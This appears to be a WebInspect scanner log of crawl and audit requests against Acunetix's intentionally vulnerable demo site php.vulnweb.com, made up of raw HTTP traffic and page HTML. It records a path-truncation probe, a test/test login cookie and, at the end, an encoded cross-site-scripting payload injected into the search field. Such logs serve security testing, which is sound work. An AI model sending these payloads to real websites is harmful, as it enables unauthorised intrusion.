  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
	  <?PHP if (isset($_COOKIE["login"]))echo '<li><a href="../logout.php">Logout</a>'; ?></li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p><img src="images/add.jpg" alt="" width="107" height="66"></p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="redir.php?r=index.php">Site
  Map</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wasp@acunetix.com">Contact Us</a> | &copy;2004
  Acunetix Ltd 
</div> 
<br> 
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:56:46 GMT</Value></Header><Header><Name>ETag</Name><Value>"4dca64a4-cc1"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>application/octet-stream</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Wed, 11 May 2011 10:27:48 GMT</Value></Header><Header><Name>Content-Length</Name><Value>3265</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="4AB6FA19F6334A625707397B312A1F8D"><URL>http://php.vulnweb.com:80/search.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="4AB6FA19F6334A625707397B312A1F8D"><![CDATA[POST /search.php HTTP/1.1
Referer: http://php.vulnweb.com/index.bak
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="4AB6FA19F6334A625707397B312A1F8D";PSID="CD811DE5F26763847E074C6E95280DA4";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Qualified";LinkKind="FormAction";Locations="HtmlNode";Source="StaticParser";tid="59";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="8877fd2d";
X-Request-Memo: ID="4170abb4";sc="2";tid="37";
Cookie: CustomCookie=WebInspect0

searchFor=12345&goButton=go]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:56:49 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4774

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>search</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>searched for: 12345</h2></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="4AB6FA19F6334A625707397B312A1F8D"><Method>POST</Method><Path>/</Path><File>search</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>searchFor=12345&amp;goButton=go</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/index.bak</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>27</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="4AB6FA19F6334A625707397B312A1F8D";PSID="CD811DE5F26763847E074C6E95280DA4";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Qualified";LinkKind="FormAction";Locations="HtmlNode";Source="StaticParser";tid="59";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="8877fd2d";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="4170abb4";sc="2";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>search</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>searched for: 12345</h2></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:56:49 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4774</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="ED218ED39AD99F6EAB19B7198D05DD5F"><URL>http://php.vulnweb.com:80/redir.php?r=index.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="ED218ED39AD99F6EAB19B7198D05DD5F"><![CDATA[GET /redir.php?r=index.php HTTP/1.1
Referer: http://php.vulnweb.com/index.bak
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="ED218ED39AD99F6EAB19B7198D05DD5F";PSID="CD811DE5F26763847E074C6E95280DA4";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";NodeName="a";Source="StaticParser";tid="59";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="4c15657b";
X-Request-Memo: ID="59adeb25";sc="2";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 302 Moved Temporarily
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:56:49 GMT
Server: nginx/1.19.0
Location: index.php
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5

0

]]></RawResponse><Request id="ED218ED39AD99F6EAB19B7198D05DD5F"><Method>GET</Method><Path>/</Path><File>redir</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>r=index.php</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>r</Name><Value>index.php</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/index.bak</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="ED218ED39AD99F6EAB19B7198D05DD5F";PSID="CD811DE5F26763847E074C6E95280DA4";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";NodeName="a";Source="StaticParser";tid="59";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="4c15657b";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="59adeb25";sc="2";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>302</StatusCode><StatusDescription>Moved Temporarily</StatusDescription><SetCookie /><ResponseBody><![CDATA[0

]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:56:49 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Location</Name><Value>index.php</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="B240BC7058D41BE3C3F3C2BB2A1D579C"><URL>http://php.vulnweb.com:80/redir.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="B240BC7058D41BE3C3F3C2BB2A1D579C"><![CDATA[GET /redir.php HTTP/1.1
Referer: http://php.vulnweb.com/redir.php?r=index.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="B240BC7058D41BE3C3F3C2BB2A1D579C";PSID="ED218ED39AD99F6EAB19B7198D05DD5F";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="34";tt="11";
X-RequestManager-Memo: sid="35";smi="0";sc="1";ID="ed2ce96a";
X-Request-Memo: ID="1efe3252";sc="1";tid="43";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 302 Moved Temporarily
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:57:40 GMT
Server: nginx/1.19.0
Location: 
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5

0

]]></RawResponse><Request id="B240BC7058D41BE3C3F3C2BB2A1D579C"><Method>GET</Method><Path>/</Path><File>redir</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/redir.php?r=index.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="B240BC7058D41BE3C3F3C2BB2A1D579C";PSID="ED218ED39AD99F6EAB19B7198D05DD5F";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="34";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="35";smi="0";sc="1";ID="ed2ce96a";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="1efe3252";sc="1";tid="43";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>302</StatusCode><StatusDescription>Moved Temporarily</StatusDescription><SetCookie /><ResponseBody><![CDATA[0

]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:57:40 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Location</Name><Value /></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="AF32B09A3A32CC5ED22E6CBEF22EB810"><URL>http://php.vulnweb.com:80/redir.php?r=index.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="AF32B09A3A32CC5ED22E6CBEF22EB810"><![CDATA[HEAD /redir.php?r=index.php HTTP/1.1
Referer: http://php.vulnweb.com/index.bak
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
Cookie: CustomCookie=WebInspect0;login=test%2Ftest

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 302 Moved Temporarily
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:57:32 GMT
Server: nginx/1.19.0
Location: index.php
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1

]]></RawResponse><Request id="AF32B09A3A32CC5ED22E6CBEF22EB810"><Method>HEAD</Method><Path>/</Path><File>redir</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>r=index.php</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0;login=test%2Ftest
</Cookie><Queries><Query><Name>r</Name><Value>index.php</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/index.bak</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie><Cookie><Name>login</Name><Value>test%2Ftest</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>302</StatusCode><StatusDescription>Moved Temporarily</StatusDescription><SetCookie /><ResponseBody /><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:57:32 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Location</Name><Value>index.php</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="E6FADCDC4407BE5161D063B2AF83DC3B"><URL>http://php.vulnweb.com:80/search.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>searchFor</AttackParamDescriptor><Issues><Issue id="82ea0ec9-5ddf-412d-a6cb-c86fb61ef192"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[POST /search.php HTTP/1.1
Referer: http://php.vulnweb.com/index.bak
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="E6FADCDC4407BE5161D063B2AF83DC3B";PSID="4AB6FA19F6334A625707397B312A1F8D";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="searchFor";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2535%2536%2538%2536%2532%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="6d45ee81";
X-Request-Memo: ID="1ed5f0b4";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

